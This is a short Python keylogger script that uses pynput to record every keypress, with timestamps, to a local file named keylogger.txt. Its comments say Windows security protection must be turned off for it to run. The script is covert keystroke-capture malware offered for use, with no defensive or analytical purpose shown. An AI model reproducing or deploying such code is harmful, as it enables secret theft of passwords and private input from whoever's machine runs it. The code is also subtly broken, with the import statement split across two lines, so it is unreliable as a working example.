#windows security protection must be turned off for this program to run successfully
#pip3 should be installed
#install and import pynput

from pynput.keyboard 
import Key, Listener
import logging
#specfic directory name can also be provided
logs = ""
#formatted with date and time
logging.basicConfig(filename=(logs + "keylogger.txt"), level = logging.DEBUG, format='%(asctime)s: %(message)s')
def on_press(key):
  logging.info(str(key))
with Listener(on_press = on_press) as Listener:
  Listener.join()


